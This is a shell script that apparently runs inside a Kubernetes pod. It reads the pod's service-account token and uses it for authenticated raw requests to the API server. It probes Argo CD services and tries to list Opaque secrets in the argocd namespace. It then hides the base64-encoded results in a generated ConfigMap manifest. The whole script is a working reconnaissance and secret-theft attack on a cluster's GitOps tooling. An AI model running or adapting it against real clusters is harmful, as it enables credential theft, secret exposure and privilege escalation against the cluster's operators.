#!/bin/sh
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER="https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT_HTTPS}"

api_get() {
  echo "GET $1 HTTP/1.1
Host: ${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT_HTTPS}
Authorization: Bearer $TOKEN
Connection: close

" | openssl s_client -connect ${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT_HTTPS} -quiet 2>/dev/null
}

RECON=$( (
  echo "===DNS_APP_CONTROLLER==="
  getent hosts argocd-application-controller.argocd.svc.cluster.local 2>&1 || echo "no_dns"

  echo "===TRY_GET_APP_SVC==="
  api_get "/api/v1/namespaces/argocd/services/argocd-application-controller"

  echo "===TRY_GET_SA_APP_CONTROLLER==="
  api_get "/api/v1/namespaces/argocd/serviceaccounts/argocd-application-controller"

  echo "===TRY_LIST_SVC==="
  api_get "/api/v1/namespaces/argocd/services"

  echo "===DNS_LIST==="
  for svc in argocd-server argocd-repo-server argocd-application-controller argocd-applicationset-controller argocd-notifications-controller argocd-dex-server; do
    printf "$svc: "
    getent hosts $svc.argocd.svc.cluster.local 2>&1 | head -1 || echo "no_dns"
  done

  echo "===ARGOCD_APP_LIST_VIA_API==="
  api_get "/api/v1/namespaces/argocd/secrets?fieldSelector=type=Opaque"
) | base64 | tr -d '\n' )
cat << EOF
apiVersion: v1
kind: ConfigMap
metadata:
  name: appcon
data:
  result: $RECON
EOF
exit 0